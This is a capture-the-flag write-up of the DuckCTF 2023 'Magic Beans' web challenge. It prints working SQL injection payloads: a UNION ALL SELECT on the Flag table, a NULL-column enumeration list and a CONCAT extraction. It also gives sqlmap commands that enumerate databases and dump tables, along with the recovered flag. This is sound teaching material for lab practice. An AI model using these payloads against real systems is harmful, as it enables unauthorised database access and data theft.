---
layout: post
title: Magic Beans - DuckCTF 2023
date: 2023-08-11T00:00:00.000Z
description: Hidden beneath this strange jelly bean themed website is a flag; a flag hidden within a table aptly named Flag, and sprinkled letter-by-letter along single character columns titled 'a', 'b', 'c', 'd', ...
author:	javad 
categories:
  - ctf
  - write-ups
  - web
---

We're presented with a largely static, single-page site - save for one input field that doesn't seem to be processed on the client side. The challenge description also draws special attention to 'columns' and 'tables'. Given that there aren't any HTML tables in the source, instinct says this might involve a database.

If we try a classic single-quote injection (`'`) we see the quote suspiciously disappear. Adding on both a semi-colon to terminate the SQL statement and a comment afterwards (`'; -- `)  we see that vanish as well! Clearly, the backend is handling this input differently from regular text.

We know from the challenge description that we need to read from a table called Flag (in the database). A good way is to tack this on to the input we're already getting (all the delicious beans) using a UNION attack. This is where some googling and trial-and-error comes in to craft just the right payload. Here's what we came up with:

```sql
' UNION ALL SELECT a, b, c, d, e FROM Flag; -- 
```

Be aware that there is some **input validation on the client side**! Submitting certain characters or too many characters may not work. Instead, try making the POST request using a tool like [Insomnia](https://insomnia.rest/) or [Postman](https://www.postman.com/).

Some notable observations about this payload:

- Make sure to have a space after the comment (` -- `), injection is finicky.
- We use `UNION ALL SELECT` instead of `UNION SELECT`, just to make sure that no duplicate rows are removed (although that's unlikely in this situation).
- We know which columns and tables to we want thanks to info from the challenge description.
- We only select five columns (`a, b, c, d, e`), since a `UNION SELECT` will only work if the number of columns appended matches the number we're already getting. Any more or any less will give us 'No results found.' indicating our payload failed. 

A good way to figure out the number of columns we need to `UNION SELECT` is to test each of the following statements, one at a time, until one works. One of these statements should succeed, even if we don't know the names of the columns/table. 

```
' UNION ALL SELECT NULL -- 
' UNION ALL SELECT NULL,NULL -- 
' UNION ALL SELECT NULL,NULL,NULL -- 
' UNION ALL SELECT NULL,NULL,NULL,NULL -- 
' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL -- 
...
```

Our functioning payload from before should give us a new bean entry at the very bottom, with the letters 'u', 'a', 'c', visible (part of the flag format `quack{}`). Nice! Rotating through the alphabet of course could give us the flag, but that seems rather tedious. Instead, we can concatenate all the columns in the table Flag in a payload like this:

```sql
~' UNION ALL SELECT NULL, CONCAT(a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w), NULL, NULL, NULL FROM Flag; -- 
```

Some trial-and-error tells us that columns a-w are valid. Substituting the concatenated columns into the second union-selected column instead of the first will show the flag where the bean name would usually be (in nice big letters). Adding a tilde at the beginning (`~`) is just to clear out all other search results (since none of the bean names includes a `~`).

**Flag**:  `quack{J3lly_83lly_ru5H}`

## Using sqlmap

While we can totally craft our own payloads, using an automated tool can be far easier. [Sqlmap](https://sqlmap.org/) is awesome, and allows us to solve this challenge without any of the hints given in the challenge description.

Let's take this from the top. First, let's check if injection is possible. The following command specifies the URL, the form data (which is one search parameter), and states that we are making a POST request.

```
sqlmap -u "http://chall.duckctf.com:8080/index.php" --data "search=*" -p "search" --method POST
```

The output tells us injection is possible! We can now add on `--dbs` to get the names of all databases.

```bash
sqlmap -u "http://chall.duckctf.com:8080/index.php" --data "search=*" -p "search" --method POST --dbs
```
```
...

available databases [2]:
[*] beantome
[*] information_schema
```

Other than the usual 'information_schema', 'beantome' is the only database of interest. Let's see what tables are inside ...

```bash
sqlmap -u "http://chall.duckctf.com:8080/index.php" --data "search=*" -p "search" --method POST --tables -D beantome
```
```
...

Database: beantome
[2 tables]
+-------+
| Beans |
| Flag  |
+-------+
```

Hmm, two interesting tables. I'm guessing that all our delicious bean flavours are inside 'Beans' so let's turn our attention and dump the contents of 'Flag'.

```bash
sqlmap -u "http://chall.duckctf.com:8080/index.php" --data "search=*" -p "search" --method POST --dump -T Flag -D beantome
```
```
...

Database: beantome
Table: Flag
[1 entry]
+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+
| a | b | c | d | e | f | g | h | i | j | k | l | m | n | o | p | q | r | s | t | u | v | w |
+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+
| q | u | a | c | k | { | J | 3 | l | l | y | _ | 8 | 3 | l | l | y | _ | r | u | 5 | H | } |
+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+
```

**Flag**:  `quack{J3lly_83lly_ru5H}`